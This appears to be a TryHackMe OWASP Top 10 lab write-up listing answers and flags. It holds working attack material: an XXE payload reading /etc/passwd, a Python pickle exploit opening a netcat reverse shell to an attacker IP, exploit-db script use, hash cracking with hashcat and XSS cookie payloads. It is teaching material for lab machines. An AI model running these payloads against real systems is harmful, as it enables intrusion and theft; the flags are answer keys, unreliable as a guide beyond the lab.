# OWASP Top 10

## \[Severity 1] Command Injection Practical

#### What strange text file is in the website root directory?

![](<../../.gitbook/assets/Screenshot from 2022-04-17 15-16-45.png>)

{% hint style="success" %}
`drpepper.txt`
{% endhint %}

#### How many non-root/non-service/non-daemon users are there?

![](<../../.gitbook/assets/Screenshot from 2022-04-17 15-18-45.png>)

{% hint style="success" %}
`0`
{% endhint %}

#### What user is this app running as?

![](<../../.gitbook/assets/Screenshot from 2022-04-17 15-19-16.png>)

{% hint style="success" %}
`www-data`
{% endhint %}

#### What is the user's shell set as?

![](<../../.gitbook/assets/Screenshot from 2022-04-17 15-25-24.png>)

{% hint style="success" %}
`/usr/sbin/nologin`
{% endhint %}

#### What version of Ubuntu is running?

![](<../../.gitbook/assets/Screenshot from 2022-04-17 15-20-20.png>)

{% hint style="success" %}
`18.04.4`
{% endhint %}

#### Print out the MOTD. What favorite beverage is shown?

![](<../../.gitbook/assets/Screenshot from 2022-04-17 15-24-24.png>)

{% hint style="success" %}
`DR PEPPER`
{% endhint %}

## \[Severity 2] Broken Authentication Practical

#### **What is the flag that you found in darren's account?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-26-24.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-17 15-46-49.png>)

{% hint style="success" %}
`fe86079416a21a3c99937fea8874b667`
{% endhint %}

#### Now try to do the same trick and see if you can login as arthur. **What is the flag that you found in arthur's account?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-27-34.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-17 15-47-53.png>)

{% hint style="success" %}
`d9ac0f7db4fda460ac3edeb75d75e16e`
{% endhint %}

## \[Severity 3] Sensitive Data Exposure (Challenge)

#### **What is the name of the mentioned directory?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 20-39-16.png>)

{% hint style="success" %}
`/assets`
{% endhint %}

#### **Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-50-23.png>)

{% hint style="success" %}
`webapp.db`
{% endhint %}

#### Use the supporting material to access the sensitive data. What is the password hash of the admin user?

```bash
wget http://10.10.63.208/assets/webapp.db
sqlite3 webapp.db
.table
.schema users
SELECT * FROM users;
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-52-14.png>)

{% hint style="success" %}
`4413096d9c933359b898b6202288a650`
{% endhint %}

#### **What is the admin's plaintext password?**

```bash
echo '6eea9b7ef19179a06954edd0f6c05ceb' > md5.txt
hashcat -a 0 -m 0 md5.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-55-56.png>)

{% hint style="success" %}
`qwertyuiop`
{% endhint %}

#### **Login as the admin. What is the flag?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 20-46-26.png>)

{% hint style="success" %}
`THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`
{% endhint %}

## \[Severity 4] XML External Entity - eXtensible Markup Language

#### **Full form of XML**

{% hint style="success" %}
`eXtensible Markup Language`
{% endhint %}

#### **Is it compulsory to have XML prolog in XML documents?**

{% hint style="success" %}
`No`
{% endhint %}

#### **Can we validate XML documents against a schema?**

{% hint style="success" %}
`Yes`
{% endhint %}

#### **How can we specify XML version and encoding in XML document?**

{% hint style="success" %}
`XML Prolog`
{% endhint %}

## \[Severity 4] XML External Entity - DTD

#### **How do you define a new ELEMENT?**

```
!ELEMENT
```

#### **How do you define a ROOT element?**

```
!DOCTYPE
```

#### **How do you define a new ENTITY?**

```
!ENTITY
```

## \[Severity 4] XML External Entity - XXE Payload

```markup
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
<userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
</userInfo>
```

```markup
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

## \[Severity 4] XML External Entity - Exploiting

#### Try to display your own name using any payload.

![](<../../.gitbook/assets/Screenshot from 2022-04-17 18-33-27.png>)

#### See if you can read the /etc/passwd. **What is the name of the user in /etc/passwd**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-24-32.png>)

{% hint style="success" %}
`falcon`
{% endhint %}

#### **Where is falcon's SSH key located?**

{% hint style="success" %}
`/home/falcon/.ssh/id_rsa`
{% endhint %}

#### **What are the first 18 characters for falcon's private key**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-25-18.png>)

```bash
echo -n 'MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzK' | cut -c -18
```

{% hint style="success" %}
`MIIEogIBAAKCAQEA7b`
{% endhint %}

## \[Severity 5] Broken Access Control (IDOR Challenge)

#### Deploy the machine and go to [http://10.10.150.60](http://10.10.150.60) - Login with the username being noot and the password test1234. **Look at other users notes. What is the flag?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-38-41.png>)

{% hint style="success" %}
`flag{fivefourthree}`
{% endhint %}

## \[Severity 6] Security Misconfiguration

#### **Hack into the webapp, and find the flag!**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-48-03.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-46-34.png>)

{% hint style="success" %}
`thm{4b9513968fd564a87b28aa1f9d672e17}`
{% endhint %}

## \[Severity 7] Cross-site Scripting

#### Navigate to [http://10.10.244.21/](http://10.10.244.21) in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

```markup
<script>alert("Hello")</script>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-03-56.png>)

{% hint style="success" %}
`ThereIsMoreToXSSThanYouThink`
{% endhint %}

#### **On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.**

```markup
<script>alert(window.location.hostname)</script>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-10-18.png>)

{% hint style="success" %}
`ReflectiveXss4TheWin`
{% endhint %}

#### Now navigate to [http://10.10.244.21/](http://10.10.244.21) in your browser and click on the "Stored XSS" tab on the navbar; make an account. Then add a comment and see if you can insert some of your own HTML.

```markup
<h1>test</h1>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-13-06.png>)

{% hint style="success" %}
`HTML_T4gs`
{% endhint %}

#### **On the same page, create an alert popup box appear on the page with your document cookies.**

```markup
<script>alert(document.cookie)</script>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-15-00.png>)

{% hint style="success" %}
`W3LL_D0N3_LVL2`
{% endhint %}

#### **Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.**

```markup
<script>document.getElementById("thm-title").textContent="I am a hacker"</script>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-18-22.png>)

{% hint style="success" %}
`websites_can_be_easily_defaced_with_xss`
{% endhint %}

## \[Severity 8] Insecure Deserialization

#### &#x20;**#1 Who developed the Tomcat application?**

{% hint style="success" %}
`The Apache Software Foundation`
{% endhint %}

#### #2 **What type of attack that crashes services can be performed with insecure deserialization?**

{% hint style="success" %}
`Denial of Service`
{% endhint %}

## \[Severity 8] Insecure Deserialization - Objects

#### Select the correct term of the following statement: **if a dog was sleeping, would this be:**

```
A behavior
```

## \[Severity 8] Insecure Deserialization - Deserialization

#### **What is the name of the base-2 formatting that data is sent across a network as?**&#x20;

{% hint style="success" %}
`binary`
{% endhint %}

## \[Severity 8] Insecure Deserialization - Cookies

#### **If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?**

{% hint style="success" %}
`webapp.com/login`
{% endhint %}

#### **What is the acronym for the web technology that Secure cookies work over?**

{% hint style="success" %}
`https`
{% endhint %}

## \[Severity 8] Insecure Deserialization - Cookies Practical

#### **1st flag (cookie value)**

```
echo -n 'gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAOTVkNWFmYzZiMmNiNDI2M2FkOGU1ZmViMmE3MmJhYjBxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==' \
| base64 -d
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 23-23-09.png>)

{% hint style="success" %}
`THM{good_old_base64_huh}`
{% endhint %}

#### **2nd flag (admin dashboard)**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 23-23-51.png>)

{% hint style="success" %}
`THM{heres_the_admin_flag}`
{% endhint %}

## \[Severity 8] Insecure Deserialization - Remote Code Execution

![](<../../.gitbook/assets/image (8) (1).png>)

![](<../../.gitbook/assets/image (7) (1).png>)

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

#### **flag.txt**

```bash
wget https://gist.githubusercontent.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3/raw/f0fce6310455d8c345bbc9ec81f41d224896b9c5/rce.py
sed -i 's/YOUR_TRYHACKME_VPN_IP/10.9.101.193/' rce.py
python rce.py
```

```
nc -nvlp 4444
cat /home/cmnatic/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-27 09-36-58.png>)

{% hint style="success" %}
`4a69a7ff9fd68`
{% endhint %}

## \[Severity 9] Components With Known Vulnerabilities - Practical

#### **How many characters are in /etc/passwd**

```bash
searchsploit book store
searchsploit -m 47887
python3 47887.py http://10.10.213.160
> wc -c /etc/passwd
```

![](<../../.gitbook/assets/Screenshot from 2020-08-27 10-15-17.png>)

{% hint style="success" %}
`1611`
{% endhint %}

## \[Severity 10] Insufficient Logging and Monitoring

#### **What IP address is the attacker using?**

```
cat login-logs.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 23-07-13.png>)

{% hint style="success" %}
`49.99.13.16`
{% endhint %}

#### **What kind of attack is being carried out?**

{% hint style="success" %}
`brute force`
{% endhint %}

## Support Material

{% embed url="https://www.tutorialspoint.com/dtd/dtd_entities.htm" %}

{% embed url="https://www.quora.com/What-is-the-state-and-behaviour-of-an-object" %}

{% embed url="https://gist.githubusercontent.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3/raw/f0fce6310455d8c345bbc9ec81f41d224896b9c5/rce.py" %}

{% embed url="https://www.exploit-db.com/exploits/47887" %}

{% embed url="http://www.xss-payloads.com" %}

